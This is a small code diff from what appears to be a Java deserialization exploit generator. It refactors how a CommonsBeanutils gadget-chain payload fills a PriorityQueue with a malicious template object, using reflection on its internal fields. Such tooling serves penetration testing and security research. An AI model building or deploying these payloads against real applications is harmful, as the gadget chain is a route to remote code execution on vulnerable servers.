@@ -32,11 +32,7 @@ public class CommonsBeanutils1183NOCC implements ObjectPayload<Object> {
 		// switch method called by comparator
 		Reflections.setFieldValue(comparator, "property", "outputProperties");
 		Reflections.setFieldValue(comparator, "comparator", String.CASE_INSENSITIVE_ORDER);
-
-		// switch contents of queue
-		final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
-		queueArray[0] = template;
-		queueArray[1] = template;
+		Reflections.setFieldValue(queue, "queue", new Object[]{template, template});
 
 		return queue;
 	}
